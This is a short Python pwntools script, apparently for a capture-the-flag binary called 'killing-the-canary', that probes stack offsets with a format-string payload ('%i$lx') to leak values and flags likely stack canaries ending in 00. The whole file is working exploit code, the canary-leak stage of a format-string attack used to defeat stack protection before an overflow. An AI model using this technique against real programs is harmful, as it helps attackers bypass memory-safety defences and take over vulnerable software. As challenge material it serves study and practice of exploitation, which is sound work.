#!/usr/bin/env python3
import re
from pwn import *

BIN = "./killing-the-canary"
# 1 , 19 , 33 , 36 , 41 , 46
for i in range(10, 20):                     # widen range if needed
    p = process(BIN)
    p.recvuntil(b"What's your name? ")
    p.sendline(f"%{i}$lx".encode())        # print i-th stack arg in HEX

    # Program prints: "Hello, <expansion>! Let's play a game."
    line = p.recvuntil(b"! Let's play a game.\n", drop=False)
    seg  = line.split(b"Hello, ",1)[1].split(b"! Let's",1)[0]

    # Grab the printed token (8–16 hex chars)
    m = re.search(rb'\b([0-9a-fA-F]{8,16})\b', seg)
    tok = m.group(1).decode() if m else ""
    mark = "  " if not tok.endswith("00") else " *"   # canary typically …00

    print(f"offset %{i}$lx -> {tok}{mark}")
    p.close()